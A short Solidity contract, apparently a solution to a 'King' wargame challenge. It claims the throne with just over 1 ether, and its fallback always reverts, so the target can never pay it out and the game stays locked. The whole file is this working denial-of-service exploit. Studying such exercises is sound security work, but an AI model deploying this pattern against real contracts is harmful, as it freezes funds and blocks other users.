// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        payable(contractAddress).call{value: 1000000000000000001}("");
    }

    fallback() external payable {
        revert("no thank you");
    }
}
